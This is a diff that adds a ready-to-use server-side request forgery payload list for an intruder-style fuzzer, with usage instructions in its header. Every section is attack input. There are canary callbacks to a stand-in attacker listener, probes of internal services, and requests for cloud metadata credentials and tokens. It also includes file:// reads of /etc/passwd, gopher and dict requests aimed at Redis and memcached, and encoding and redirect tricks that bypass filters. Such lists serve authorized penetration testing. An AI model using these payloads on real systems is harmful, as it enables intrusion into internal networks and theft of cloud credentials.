@@ -1,0 +1,68 @@
+# ==================================================================
+#  SSRF PAYLOADS — Server-Side Request Forgery (single file)
+#  One payload per line. "#" lines are comments (pyintruder skips them).
+#  Inject as the value of a url/host param (?url=§HERE§).
+#  Detection (canary): section 0 points the server at YOUR listener with a unique
+#  token — SSRF is confirmed when the request hits your server carrying  xq9z
+#  (watch your listener, not the target's status). In-band: grep the fetched body
+#  (e.g.  root:x:  for file://, or  AccessKeyId  for AWS metadata).
+#  '&' is written %26 and '#' as %23 so URLs transmit raw. Replace your-ip.
+# ==================================================================
+
+# ---- 0. CANARY / detection — call back to your listener (watch for xq9z) ----
+http://your-ip/xq9z
+http://xq9z.your-collab/
+http://your-ip:80/xq9z
+//your-ip/xq9z
+http://your-ip/xq9z?
+
+# ---- 1. Confirm + internal reach ----
+http://127.0.0.1/
+http://127.0.0.1:80/
+http://localhost/
+http://127.0.0.1:22/
+http://127.0.0.1:3306/
+http://127.0.0.1:6379/
+http://10.0.0.1/
+http://192.168.0.1/
+http://172.17.0.1/
+
+# ---- 2. Cloud metadata (grep the body: AccessKeyId / access_token) ----
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data/
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01%26resource=https://management.azure.com/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://100.100.100.200/latest/meta-data/
+
+# ---- 3. File read / other schemes ----
+file:///etc/passwd
+file:///c:/windows/win.ini
+dict://127.0.0.1:11211/stats
+gopher://127.0.0.1:6379/_INFO
+ftp://127.0.0.1/
+http://127.0.0.1:6379/
+
+# ---- 4. Filter bypass — localhost ----
+http://127.1/
+http://0.0.0.0/
+http://[::1]/
+http://0177.0.0.1/
+http://2130706433/
+http://0x7f000001/
+http://127.0.0.1.nip.io/
+http://localtest.me/
+
+# ---- 5. Filter bypass — metadata IP ----
+http://169.254.169.254.nip.io/latest/meta-data/
+http://2852039166/latest/meta-data/
+http://[::ffff:169.254.169.254]/latest/meta-data/
+http://169.254.169.254%23.your-collab/latest/meta-data/
+
+# ---- 6. Filter bypass — allowlist / redirect / at-sign ----
+http://expected.com@169.254.169.254/latest/meta-data/
+http://169.254.169.254%23@expected.com/
+http://expected.com.your-collab/
+http://your-ip/redirect?to=http://169.254.169.254/latest/meta-data/
+https://expected.com@your-ip/xq9z
